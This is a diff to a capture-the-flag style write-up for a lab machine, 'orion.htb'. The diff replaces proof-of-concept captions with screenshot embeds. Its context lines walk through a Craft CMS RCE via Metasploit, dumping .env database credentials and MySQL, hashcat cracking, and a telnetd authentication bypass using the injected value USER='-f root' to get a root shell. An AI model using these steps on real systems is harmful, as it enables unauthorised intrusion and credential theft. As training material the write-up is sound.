@@ -43,8 +43,9 @@ Browsing to `http://orion.htb/` revealed a content management system. Further in
 ```
 Craft CMS 5.6.16
 ```
+![alt text](image.png)
 
-> **[POC — Craft CMS admin panel showing version]**
+![alt text](image-1.png)
 
 A vulnerability search against this version identified **CVE-2025-32432** — an unauthenticated pre-authentication remote code execution flaw in Craft CMS.
 
@@ -61,7 +62,7 @@ msf6 exploit(...) > set LPORT <listener_port>
 msf6 exploit(...) > exploit
 ```
 
-> **[POC — Metasploit session established]**
+![alt text](image-2.png)
 
 A shell session was obtained running as the web application service account.
 
@@ -94,7 +95,7 @@ CRAFT_DB_USER=root
 CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
 ```
 
-> **[POC — .env file contents]**
+![alt text](image-3.png)
 
 ### MySQL — Extracting the admin Hash
 
@@ -116,6 +117,7 @@ A full database dump was also taken for completeness:
 ```bash
 mysqldump -u root -p'SuperSecureCraft123Pass!' --all-databases > all_databases.sql
 ```
+![alt text](image-4.png)
 
 ### Offline Hash Cracking — Hashcat
 
@@ -132,7 +134,7 @@ The hash cracked successfully:
 Password : darkangel
 ```
 
-> **[POC — Hashcat cracked output]**
+![alt text](image-5.png)
 
 ### SSH Access as adam
 
@@ -157,7 +159,7 @@ cat /home/adam/user.txt
 e8f484c43b6748f7a26b68c83f25ea6f
 ```
 
-> **[POC — User flag output]**
+![alt text](image-6.png)
 
 ---
 
@@ -188,7 +190,7 @@ The telnetd version was identified as:
 GNU InetUtils 2.7
 ```
 
-> **[POC — telnetd version banner/output]**
+![alt text](image-7.png)
 
 This version is vulnerable to **CVE-2026-24061** — a critical (CVSS 9.8) authentication bypass in GNU InetUtils telnetd, publicly disclosed in January 2026. The flaw arises because telnetd forwards the client-supplied `USER` environment variable — set via the Telnet protocol's `NEW_ENVIRON` option during connection negotiation — directly into the invocation of `/usr/bin/login` without sanitisation. Setting `USER` to `-f root` causes `login` to interpret it as the `-f` flag (skip authentication) targeting the `root` account, granting an immediate, unauthenticated root shell.
 
@@ -202,7 +204,7 @@ USER="-f root" telnet -a 127.0.0.1
 
 The telnetd process passed this value straight through to `/usr/bin/login` as `login -f root`, which — interpreting `-f` as "skip authentication for this user" — granted an immediate root shell with no password prompt.
 
-> **[POC — Root shell obtained via telnet auth bypass]**
+
 
 ---
 
@@ -216,7 +218,7 @@ cat /root/root.txt
 b387b8034ea9b86e8b714f9008e3b229
 ```
 
-> **[POC — Root flag output]**
+![alt text](image-8.png)
 
 ---
 
